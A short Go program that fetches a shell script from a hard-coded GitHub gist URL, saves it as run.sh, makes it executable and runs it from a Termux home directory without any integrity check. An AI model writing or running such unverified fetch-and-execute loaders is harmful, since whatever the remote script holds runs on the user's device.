package main

import (
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "os/exec"
)

func main() {
        gistURL := "https://gist.githubusercontent.com/pingme998/edc9a762f113164334725a446da8ab88/raw/gistfile1.txt"
        fileName := "run.sh"

        // Download Gist file
        content, err := downloadFile(gistURL)
        if err != nil {
                fmt.Println("Error downloading file:", err)
                return
        }

        // Save content to file
        err = ioutil.WriteFile(fileName, content, 0644)
        if err != nil {
                fmt.Println("Error saving file:", err)
                return
        }

        // Grant execute permissions
        err = os.Chmod(fileName, 0755)
        if err != nil {
                fmt.Println("Error setting execute permissions:", err)
                return
        }

        // Execute the downloaded bash file
        cmd := exec.Command("/data/data/com.termux/files/home/" + fileName)
        cmd.Stdout = os.Stdout
        cmd.Stderr = os.Stderr
        err = cmd.Run()
        if err != nil {
                fmt.Println("Error executing file:", err)
                return
        }
}

func downloadFile(url string) ([]byte, error) {
        resp, err := http.Get(url)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }

        return body, nil
}
